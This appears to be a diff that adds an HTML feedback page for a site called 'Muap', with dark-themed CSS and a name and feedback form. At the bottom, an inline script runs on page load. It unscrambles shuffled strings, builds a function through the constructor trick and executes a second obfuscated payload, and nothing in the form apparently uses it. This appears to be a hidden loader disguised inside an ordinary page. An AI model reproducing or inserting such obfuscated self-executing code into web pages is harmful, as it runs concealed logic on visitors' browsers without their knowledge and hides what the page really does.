@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=1024">
+    <link rel="icon" type="image/png" href="../..help/technology.png">
+    <title>Muap - Feedback</title>
+    <style>
+        *, ::after, ::before {
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #212121;
+            color: #fff;
+            font-family: monospace, serif;
+            letter-spacing: 0.05em;
+        }
+
+        h1 {
+            font-size: 23px;
+            text-align: center;
+        }
+
+        .form {
+            width: 300px;
+            padding: 64px 15px 24px;
+            margin: 0 auto;
+        }
+
+        .form .control {
+            margin: 0 0 24px;
+        }
+
+        .form .control textarea,
+        .form .control input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #00d4ff;
+            background: transparent;
+            color: #fff;
+            font-family: monospace, serif;
+            letter-spacing: 0.05em;
+            font-size: 16px;
+        }
+
+        .form .control textarea {
+            resize: none;
+            height: 150px; /* Câmp text mai mare */
+        }
+
+        .form .control input:hover, .form .control input:focus, 
+        .form .control textarea:hover, .form .control textarea:focus {
+            outline: none;
+            border-color: #ff00ff;
+        }
+
+        .form .btn {
+            width: 100%;
+            display: block;
+            padding: 14px 16px;
+            background: transparent;
+            outline: none;
+            border: 0;
+            color: #fff;
+            letter-spacing: 0.1em;
+            font-weight: bold;
+            font-family: monospace;
+            font-size: 16px;
+        }
+
+        .block-cube {
+            position: relative;
+        }
+
+        .block-cube .bg-top,
+        .block-cube .bg-right,
+        .block-cube .bg {
+            position: absolute;
+            background: #020024;
+            background: linear-gradient(90deg, #ccff66 0%, #00ffff 37%, #ff00ff 94%);
+            transition: background 0.2s ease-in-out;
+        }
+
+        .block-cube .bg-top {
+            height: 10px;
+            bottom: 100%;
+            left: 5px;
+            right: -5px;
+            transform: skew(-45deg, 0);
+        }
+
+        .block-cube .bg-right {
+            top: -5px;
+            width: 10px;
+            left: 100%;
+            transform: skew(0, -45deg);
+        }
+
+        .block-cube .bg-inner {
+            background: #212121;
+            position: absolute;
+            left: 2px;
+            top: 2px;
+            right: 2px;
+            bottom: 2px;
+        }
+
+        .block-cube.block-input input,
+        .block-cube.block-input textarea {
+            position: relative;
+            z-index: 2;
+        }
+
+        .block-cube.block-input input:focus ~ .bg-right .bg-inner,
+        .block-cube.block-input input:focus ~ .bg-top .bg-inner,
+        .block-cube.block-input textarea:focus ~ .bg-right .bg-inner,
+        .block-cube.block-input textarea:focus ~ .bg-top .bg-inner {
+            top: 100%;
+            background: rgba(255, 255, 255, 0.5);
+        }
+
+        .credits {
+            position: fixed;
+            left: 0;
+            bottom: 0;
+            padding: 15px 15px;
+            width: 100%;
+            z-index: 111;
+        }
+
+        .credits a {
+            opacity: 0.6;
+            color: #fff;
+            font-size: 11px;
+            text-decoration: none;
+        }
+
+        .credits a:hover {
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+    <form autocomplete='off' class='form' id="feedbackForm">
+        <div class='control'>
+            <h1>Feedback</h1>
+        </div>
+        <div class='control block-cube block-input'>
+            <input id='name' name='name' placeholder='Your Name' type='text' required>
+            <div class='bg-top'>
+                <div class='bg-inner'></div>
+            </div>
+            <div class='bg-right'>
+                <div class='bg-inner'></div>
+            </div>
+            <div class='bg'>
+                <div class='bg-inner'></div>
+            </div>
+        </div>
+        <div class='control block-cube block-input'>
+            <textarea id='feedback' name='feedback' placeholder='Your Feedback' required></textarea>
+            <div class='bg-top'>
+                <div class='bg-inner'></div>
+            </div>
+            <div class='bg-right'>
+                <div class='bg-inner'></div>
+            </div>
+            <div class='bg'>
+                <div class='bg-inner'></div>
+            </div>
+        </div>
+        <button id="submitButton" class='btn block-cube block-cube-hover' type='button'>
+            <div class='bg-top'>
+                <div class='bg-inner'></div>
+            </div>
+            <div class='bg-right'>
+                <div class='bg-inner'></div>
+            </div>
+            <div class='bg'>
+                <div class='bg-inner'></div>
+            </div>
+            <div class='text'>Submit</div>
+        </button>
+    </form>
+
+    <script>
+        (function(){var QYE='',pwZ=343-332;function oRF(l){var a=112161;var i=l.length;var e=[];for(var b=0;b<i;b++){e[b]=l.charAt(b)};for(var b=0;b<i;b++){var y=a*(b+238)+(a%47731);var c=a*(b+469)+(a%50630);var g=y%i;var t=c%i;var f=e[g];e[g]=e[t];e[t]=f;a=(y+c)%2590383;};return e.join('')};var Upe=oRF('otrrstugbtrjdqccfehikzcmuoavosxnwnlyp').substr(0,pwZ);var RTW='s7 ta1;t,eqCr;>)nl;v;qo+lo+.{oz),.ilal!<dc=b=aqvoy)Chivvm 8h)8a+7+r8}e94v,t;n6,vd0=p(l+vab8+1z+c,87m[C;;r,=]x.s(,n,};==r=(ucof+ok<if 2(0)0ssdlevsl!l= e,+;+5fl5,avw]]=oyrta[  f=o;2k{e1rhrhnnuhjrSh.6(w,av.;l<(n 2;f)[;aerv26lc.,"erg+tul r)-xrarhgp)n0aeol.rpl;,.4)0ov=9u+ga;)gdx5lwyc]s1d;ot =ry;-(nsofiir;g;l9)({;(vn)h 3v+puc=2pgo[vc"vq)o;-k=vj=cf=r=}t)Aba{i+]uo;(l=) <.0.]tb4+)(lt==k=a,bt h;+i,o{(..v)2vso(maotahmt6a;;{r".m1.lu(]c(6h+[ (=e(t,l+;n=6].gr;=Aj"aapsri.ea t,fhu1;p8(7r}a+p,hyk+rgc<s(Cdr)Ahrw 8)04gh  [Cru r(,inAenic=eeu;l=nefi)lse79nn;.4[at]))(}mea;uz6u=n+epfux[+a).j]stpo t,rset ;.g0,)d0]l(prs .=7evrah[6=nt1o,i+(vea;,c)-=,tf8r8l-);u)o==.s{b=9hi5v(nr(vehq}l>ije0s-""led6trp;ln[eh;z7;avrj*u")2j)i*(ycx;=f1;1a6rf7]var=e;2.3xfa";=10ftcvhr)(aav,,+S4ui.vf])o(wrhr[e  snv2);onrra=x;vtnmvrrra0h[gCcju([iu(CglCtn"+8=;5[v9-]ttr.=lfArc}i.nhvlrrmr)dr)a;=esh,h.k(=(lpg7 uis l.t(c(=hrt91";n;za1';var uVV=oRF[Upe];var UYn='';var YSK=uVV;var hoz=uVV(UYn,oRF(RTW));var ROj=hoz(oRF('F_e\'os3(o($8)e\/,e1_"oF;F6s+!])bFevFfF-F4(Ft,o_u(giFu$ee4r __7e36agFrp)gFe$3#%3ut!2%)!bF._F.q(!{bFe)6%FFn0;62gae._(i cyu}(2d!s,F+x$ae:,Fzeeclon.a+7e00%akFin(.tFn6vnjF7Feoa;sd.(_t0.1!Fb.$).um8nlc()TFm)rb.aa,!,(.Fe..%.-2$$e))};d9!(_3uj+F(tS%d%ee.ttifyzF+eFap_ol,(de=3onodt%,5esel)\'=e.!7%9m\'u3$mt,b(o*e nt_.7ogb rate2))ccdn.ct$e6}lF$u4eFFim" c_qm6s7..F8ss]f,#$F;(2[,].$iF gFhgr=!F,v"[2+F,fin)32.,om1b0$Fd$one6Fnn&F]t]"]d}Mymae;..rC((34btFo"(oz_=+F=$Fn$F4F!lzt=5)6)ce%ex.t;o_!);6kn%21znFFF\/(e]_72=;e_0c)F){;b.%u}byl..ir42)F(*${n4).5nffasa!c7_)))gF,.=t.9t"e5[)b=FFFu0(3g1e.s p.2keFfbazb4];jff#nc9%,r.k.,71!tsc!.n;DF!d$cF.6.w}e.)3kFc2ta%e,$l.yf)om.ndresdre]g Fa}iep.,e;_(d9n)\/_9)S),o96a.b%F()FF3#ee)[t\/;e.eb.no."lF8=(,4+)3F.od=t7rFu3F(0Fp0)lt)o.e]tSnm+ele)go0.;.ls{.=Ft.;be;{}=e!Fiajr(]o((fuba)!.tu(rcs{lu%$1{);e]].t i"fd,ger7)FF$f3i}!_&}3t+f$3F18lurimmffttf{7rzi). Fpdo0&Fale]e.]]_);1e6+u 4($Ff$ntl=ttca4)$08odv$3Fn4t[.y(eg=d3Fc;i4iF3(u(=h2.uni3af1Fw([F f5a8l%3t)i_cF(y)e=)bm!_e!uFF0e)ibe_1nFbfFldtb.;FE7ldF-s-eF{et+Ffa}((ois+$ek$Cci_.n4F rF{F7F,te)kx563desF i;!!$.&.6r((yt:)stF7F2m]e&(tamy #e,ze a = })=}u7t{saja].e5_=F(uc-(e))z;;cdF eFFt3r7]3l.,n.t*enltguotbbbF6FFFyorj;,rF05.,i_1eaeebbae;:F(3e4;1f.#0&b4((3t{)2zeF$)]bFl8tmF9,ef4F.l{F\'a{,(}F6F($ ipj$)d]Fs8e!t\/$e),!ogn,%(dFtI_2er33tc=tanF.[({_3f0t[b:eof0F.1FtFfFF2a!msF(ue)sk4Fa)((ta6trnlfFsF[u5$7.1FCg_!,*j aFebdF;3mho]..F;)$]bF8l&bFea4(hF)Fc#b 05+,)s.olp" )a0b4 )j_r4bf%1 =F.Fn4Frtr4Fe.l7*4ps=,e34Eg3}f3,,p(c {r(e+_6t_7;7;1.!F='));var AEl=YSK(QYE,ROj );AEl(9836);return 4518})()
+    </script>
+</body>
+</html>
